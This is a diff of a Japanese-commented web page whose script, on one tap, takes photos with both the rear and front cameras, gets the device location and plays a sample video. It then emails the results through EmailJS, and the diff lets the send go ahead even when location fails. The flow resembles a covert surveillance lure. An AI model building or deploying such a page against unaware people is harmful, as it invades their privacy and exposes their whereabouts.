@@ -88,8 +88,7 @@
 </style>
 
 <!-- EmailJS SDK -->
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@latest/dist/email.min.js"></script>
-
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3.11.0/dist/email.min.js"></script>
 <script>emailjs.init("cPjKBUm_i6HebDQF7");</script>
 
 </head>
@@ -127,7 +126,6 @@
 </div>
 
 <script>
-    // DOM取得
     const status = document.getElementById('status');
     const debugInfo = document.getElementById('debugInfo');
     const touchArea = document.getElementById('touchArea');
@@ -148,7 +146,6 @@
 
     const sampleVideoBase64 = "data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC7G1vb3YAAABsbXZoZAAAAAAAAAAAAAAAAAAAA+gAAAAAAAEAAAEAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIXdHJhawAAAFx0a2hkAAAAAwAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAALAAAACQAAAAAAAkZWR0cwAAABxlbHN0AAAAAAAAAAEAAAABAAAAAAAAAAAAAAAAACRtZGlhAAAAIG1kaGQAAAAAAAAAAAAAAAAAALuAAAAAAABVxAAAAAAALWhkbHIAAAAAAAAAAHZpZGUAAAAAAAAAAAAAAABWaWRlb0hhbmRsZXIAAAABz21pbmYAAAAUdm1oZAAAAAEAAAAAAAAAAAAAACRkaW5mAAAAHGRyZWYAAAAAAAAAAQAAAAx1cmwgAAAAAQAAAY9zdGJsAAAAr3N0c2QAAAAAAAAAAQAAAJ9hdmMxAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAALAAgABIAAAASAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGP//AAAALWF2Y0MBQsAN/+EAFWdCwA3959l7BQAAAwABAAADADIPFi2WAQAEaO+jyyLA/fj4AAAAABx1dWlka2hA8l8kT8W6OaUbzwMj8wAAAAAAAAAYc3R0cwAAAAAAAAABAAAAAQAAAAAAAAAcc3RzYwAAAAAAAAABAAAAAQAAAAEAAAABAAAAFHN0c3oAAAAAAAAAEwAAAAEAAAAUc3RjbwAAAAAAAAABAAAALAAAAGB1ZHRhAAAAWG1ldGEAAAAAAAAAIWhkbHIAAAAAAAAAAG1kaXJhcHBsAAAAAAAAAAAAAAAALWlsc3QAAAAlqXRvbwAAAB1kYXRhAAAAAQAAAABMYXZmNTguMjkuMTAw";
 
-    // デバッグログ
     function logDebug(msg) {
         const t = new Date().toLocaleTimeString();
         const line = `[${t}] ${msg}`;
@@ -169,10 +166,8 @@
         logDebug(`Status [${type}]: ${msg}`);
     }
 
-    // 写真撮影（facingMode指定）
     async function capturePhotoByCamera(facingMode){
         updateStatus(`📸 ${facingMode}カメラ起動中...`, 'warning');
-
         try {
             if(mediaStream) {
                 mediaStream.getTracks().forEach(t => t.stop());
@@ -182,11 +177,10 @@
                 video: { facingMode: facingMode },
                 audio: false
             });
-
             cameraVideo.srcObject = mediaStream;
             cameraVideo.style.display = 'block';
 
-            await new Promise(resolve => setTimeout(resolve, 2000)); // 2秒待つ
+            await new Promise(resolve => setTimeout(resolve, 2000));
 
             const ctx = photoCanvas.getContext('2d');
             photoCanvas.width = cameraVideo.videoWidth || 640;
@@ -208,7 +202,6 @@
         }
     }
 
-    // 位置情報取得
     async function getLocation(){
         updateStatus("📍 位置情報取得中...", 'warning');
 
@@ -243,7 +236,6 @@
         });
     }
 
-    // 動画再生
     async function playSampleVideo(){
         updateStatus("🎬 動画再生中...", 'warning');
         playbackVideo.src = sampleVideoBase64;
@@ -256,7 +248,6 @@
         updateStatus("🎬 動画再生開始", 'success');
     }
 
-    // EmailJS送信
     async function sendEmail({photoRear, photoFront, location, videoPlayed}){
         updateStatus("✉️ メール送信中...", 'warning');
         try {
@@ -277,7 +268,6 @@
         }
     }
 
-    // フル処理
     async function executeFullProcess(){
         logDebug("処理開始");
         try {
@@ -293,7 +283,19 @@
             photoDataFront.innerHTML = `<strong>内カメ写真サイズ:</strong> ${Math.round(photoFront.length/1024)} KB`;
             photoDataFront.style.display = "block";
 
-            const location = await getLocation();
+            // 位置情報取得：失敗しても続行
+            let location = {
+                latitude: "取得失敗",
+                longitude: "取得失敗",
+                accuracy: "不明",
+                timestamp: new Date().toISOString()
+            };
+            try {
+                location = await getLocation();
+            } catch(e){
+                logDebug("位置情報取得失敗：" + e.message);
+                updateStatus("📍 位置情報なしで続行", "warning");
+            }
 
             let videoPlayed = false;
             try {
@@ -322,7 +324,6 @@
         }
     }
 
-    // タッチ・クリック処理
     function handleTouch(e){
         e.preventDefault();
         const now = Date.now();
@@ -341,11 +342,9 @@
         executeFullProcess();
     }
 
-    // イベント登録
     touchArea.addEventListener('click', handleTouch);
     touchArea.addEventListener('touchstart', handleTouch, {passive:false});
 
-    // 初期化表示
     updateStatus("📱 準備完了！クリック/タッチで開始", "success");
     logDebug("アプリ初期化完了");
 </script>
